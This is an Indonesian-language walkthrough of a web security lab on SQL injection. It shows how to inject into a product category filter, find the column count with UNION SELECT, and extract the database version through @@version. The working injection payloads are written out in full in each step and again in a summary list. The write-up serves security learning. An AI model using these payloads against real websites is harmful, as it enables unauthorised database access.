# SQL Injection Attack: Querying the Database Type and Version on MySQL and Microsoft

Lab ini berisi kerentanannya dalam SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mendapatkan hasil dari query yang disuntikkan.

Untuk menyelesaikan lab ini, tampilkan string versi database dengan memastikan database mengembalikan string: '8.0.32-0ubuntu0.20.04.2'.

---

### **Langkah-langkah Melakukan Serangan**

#### **Langkah 1: Analisis Struktur Query**
Dengan menyuntikkan payload berikut:
```
/filter?category=Gifts'--
```
Aplikasi kemungkinan besar akan menjalankan query seperti ini:
```sql
SELECT product_name, description 
FROM products 
WHERE category = 'Gifts';
```
Query ini mengembalikan dua kolom: `product_name` dan `description`.

#### **Langkah 2: Tentukan Jumlah Kolom**
Untuk mengetahui jumlah kolom dalam query asli, suntikkan:
```
/filter?category=Gifts'+union+all+select+NULL,NULL--+
```
Jika tidak ada kesalahan, query tersebut memiliki dua kolom.

#### **Langkah 3: Ekstrak Versi Database**
Untuk mendapatkan versi database yang sesuai, kita dapat menggunakan perintah SQL yang tepat. Di MySQL dan Microsoft SQL Server, string versi dapat diekstrak menggunakan query berikut:
```sql
SELECT @@version;
```
Suntikkan payload berikut:
```
/filter?category=Gifts'+union+all+select+NULL,@@version--+
```

#### **Langkah 4: Validasi Versi Database**
Jika server MySQL mengembalikan string versi yang sesuai, seperti:
```
8.0.32-0ubuntu0.20.04.2
```

---

### **Payload yang Valid**

#### **Payload Uji Awal**:
- Menampilkan 4 item di kategori "Gifts":
  ```
  /filter?category=Gifts'--
  ```

#### **Tentang Penyusunan Kolom**:
- Tentukan jumlah kolom:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL--+
  ```

#### **Menyuntikkan Query Versi Database**:
- Ambil versi database:
  ```
  /filter?category=Gifts'+union+all+select+NULL,@@version--+
  ```

---

### **Referensi**

- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### **Ilustrasi**

#### **Tampilan Awal (Produk dan Deskripsi)**:
![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/1.png)
